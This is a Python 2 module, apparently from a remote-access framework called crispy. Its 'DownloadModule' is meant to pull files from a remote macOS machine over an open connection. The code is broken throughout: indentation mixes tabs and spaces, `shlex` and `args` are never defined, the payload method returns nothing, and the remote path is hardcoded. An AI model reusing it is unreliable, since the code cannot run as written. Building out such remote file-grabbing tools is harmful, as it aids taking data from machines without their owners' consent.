import cPickle
import logging

from crispy.lib.myparser import CrispyArgumentParser
from crispy.lib.module import *
from crispy.lib.fprint import *

logger = logging.getLogger(__name__)

__class_name__ = "DownloadModule"
class DownloadModule(CrispyModule):
    """ Download file from remote machine. """

    # can be: 'darwin', 'nt', 'android'
    compatible_systems = ['darwin']

    def init_argparse(self):
        self.parser = CrispyArgumentParser(prog="download", description=self.__doc__)
	self.parser.add_argument("local_file", metavar="<local_path>", nargs="?", type=str)
        self.parser.add_argument("remote_file", metavar="<remote_path>", required=True, type=str)
        
        try:
            pargs = self.parser.parse_args(shlex.split(args))
            return True
        except:
            return False

    def marshall_me(self):
        import os

        pass

    def run(self, args):
	remote_file = "file.jpg"

        if (self.is_compatible()):	
	    try:
	        logger.info("Downloading file now...")
	        info("Attempting download of %s ..." %(remote_file))
	        data = cPickle.dumps(self.marshall_me(), -1)
                self.conn.sendall(data)
                print self.client.conn.recv(1024)
	        logger.info("File transfer complete.")
                success("File transfer complete.")
	    except:
	        error("File transfer failed.")
        else:
            error("OS not implmented yet... help me code it?")
